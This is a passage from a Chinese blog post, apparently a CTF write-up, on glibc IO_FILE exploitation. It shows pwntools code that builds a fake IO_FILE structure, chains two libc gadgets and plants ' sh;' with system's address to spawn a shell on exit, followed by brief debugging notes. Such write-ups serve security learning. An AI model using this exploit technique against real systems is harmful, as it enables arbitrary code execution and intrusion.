<span class="n">gadget1</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x16a06a</span> 
<span class="c1"># mov    rbp,QWORD PTR [rdi+0x48]
# mov    rax,QWORD PTR [rbp+0x18]
# lea    r13,[rbp+0x10]
# mov    DWORD PTR [rbp+0x10],0x0
# mov    rdi,r13
# call   QWORD PTR [rax+0x28]
</span>
<span class="n">gadget2</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x882cf</span>
<span class="c1">#xor esi, esi ; mov rdi, rbp ; call qword ptr [r13 + 0x10]
</span>

<span class="n">fake_IO_FILE</span> <span class="o">=</span> <span class="nc">IO_FILE_plus_struct</span><span class="p">()</span>
<span class="c1"># fake_IO_FILE.house_of_apple2_execmd_when_exit(_IO_list_all,_IO_wfile_jumps,sys_addr)
</span>
<span class="n">fake_IO_FILE</span><span class="p">.</span><span class="n">vtable</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">_IO_wfile_jumps</span><span class="p">)</span>
<span class="n">fake_IO_FILE</span><span class="p">.</span><span class="n">_IO_save_base</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">fake_IO_addr</span><span class="o">+</span><span class="mh">0x260</span><span class="p">)</span>
<span class="n">fake_IO_FILE</span><span class="p">.</span><span class="n">_mode</span> <span class="o">=</span> <span class="mh">0xffffffff</span>
<span class="n">fake_IO_FILE</span><span class="p">.</span><span class="n">_lock</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">_lock</span><span class="p">)</span>
<span class="n">fake_IO_FILE</span><span class="p">.</span><span class="n">_wide_data</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">fake_IO_addr</span><span class="o">+</span><span class="mh">0x200</span><span class="p">)</span>
<span class="n">fake_IO_FILE</span><span class="p">.</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">fake_IO_FILE</span><span class="p">.</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">fake_IO_FILE</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>	<span class="o">//</span><span class="n">之前卡在一个</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2a0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x260</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s"> sh;</span><span class="sh">'</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x270</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x278</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">fake_IO_addr</span><span class="o">+</span><span class="mh">0x268</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x280</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x290</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">gadget2</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x2e0</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">fake_IO_addr</span><span class="o">+</span><span class="mh">0x300</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x368</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">gadget1</span><span class="p">)</span>
<span class="nf">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">payload</span><span class="p">[</span><span class="mh">0x10</span><span class="p">:])</span>
<span class="nf">exit</span><span class="p">()</span>

<span class="nf">inter</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/2025-11-23-IOstudy.assets/image-20251104200514896.png" alt="image-20251104200514896" /></p>

<p>之前一直卡在这里没进去，服了，就是没修过rdp的值，导致<code class="language-plaintext highlighter-rouge">[rbp+0x18]</code>和<code class="language-plaintext highlighter-rouge">[rdx+0x18]</code>的值有冲突，一个必须为0，一个必须写数据，还好后面改了rbp就简单了，但是吧，还不够格，因为 <code class="language-plaintext highlighter-rouge">mov    DWORD PTR [rbp+0x10],0x0</code>又清零参数，恶心的很，还好再找个gadget2把’ sh;’参数传给rdi，就简单了</p>

<p><img src="/assets/2025-11-23-IOstudy.assets/image-20251104201041594.png" alt="image-20251104201041594" /></p>

<p><strong>找gadget也是真的有意思，直接tele看不见，只有x/8i addr 这样才看得到gadget</strong></p>


    <div class="share" style="margin-bottom: 3rem;">
  
</div>

<div class="post-navigation-wrapper">
  
  
  <a href="/%E6%8A%80%E6%9C%AF/2025/08/01/my-second-post/" class="nav-card prev">
    <div class="nav-label">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
      上一篇
    </div>
    <div class="nav-title">seccomp沙盒绕过</div>
  </a>
  

  
  <div class="nav-card empty"></div>
  

</div>


    


  </article>

  

</main>

<footer class="footer">
  <div class="container">
    <div class="copyright  typeset">
      <small class="small">&copy; Liyck的技术博客 2025</small>
    </div>

    
  <nav class="nav">
  <ul class="list list--nav">
    
      
    
      
        <li class="item  item--nav">

          

          
            <a href="/about/">关于</a>
          
        </li>
      
    
      
        <li class="item  item--nav">

          

          
            <a href="/categories/">所有分类</a>
          
        </li>
      
    
      
        <li class="item  item--nav">

          

          
            <a href="/elements/">Elements</a>
          
        </li>
      
    
      
        <li class="item  item--nav">

          

          
            
            <a href="/blog/"></a>
          
        </li>
      
    
      
        <li class="item  item--nav">

          

          
            <a href="/">二进制手的技术博客</a>
          
        </li>
      
    
      
        <li class="item  item--nav">

          

          
            <a href="/offline/">Looks like you're offline</a>
          
        </li>
      
    
      
        <li class="item  item--nav">

          

          
            <a href="/projects/">项目</a>
          
        </li>
      
    
      
        <li class="item  item--nav">

          

          
            <a href="/search/">搜索</a>
          
        </li>
      
    
      
        <li class="item  item--nav">

          

          
            <a href="/thanks/">Thanks!</a>
          
        </li>
      
    
      
        <li class="item  item--nav">

          

          
            <a href="/tags/jekyll/">Jekyll</a>
          
        </li>
      
    
      
        <li class="item  item--nav">

          

          
            <a href="/tags/markdown/">Markdown</a>
          
        </li>
      
    
      
        <li class="item  item--nav">

          

          
            <a href="/categories/%E6%8A%80%E6%9C%AF/">技术</a>
          
        </li>
      
    
      
        <li class="item  item--nav">

          

          
            <a href="/categories/e68a80e69caf/">技术</a>
          
        </li>
      
    
  </ul>
</nav>



  </div>
</footer>



    <script type="text/javascript">
(() => {
  const registerServiceWorker = () => {
    if (!navigator.serviceWorker) {
      return;
    }

    navigator.serviceWorker
      .register("/sw.js")
      .then(registration => {
        console.log("Service Worker: registered");
      })
      .catch(err => {
        console.log("Service Worker: registration failed ", err);
      });
  };

  registerServiceWorker();
})();
</script>


    <!-- 阅读进度条脚本（放这里是正确的） -->
<script>
document.addEventListener("scroll", function () {
  const docHeight = document.documentElement.scrollHeight - window.innerHeight;
  const scrollTop = document.documentElement.scrollTop;
  const progress = (scrollTop / docHeight) * 100;

  const bar = document.getElementById("reading-progress");
  if (bar) {
    bar.style.width = progress + "%";
  }
});
</script>

    
    <div id="reading-progress"></div>
<button id="back-to-top" title="回到顶部 🚀">
  <svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
    <circle cx="12" cy="12" r="11" fill="#ffffff" stroke="#10b981" stroke-width="2"/>
    <path d="M15 14L12 11L9 14" stroke="#10b981" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
    <path d="M12 11V18" stroke="#10b981" stroke-width="2.5" stroke-linecap="round"/>
  </svg>
</button>

  </body>

</html>
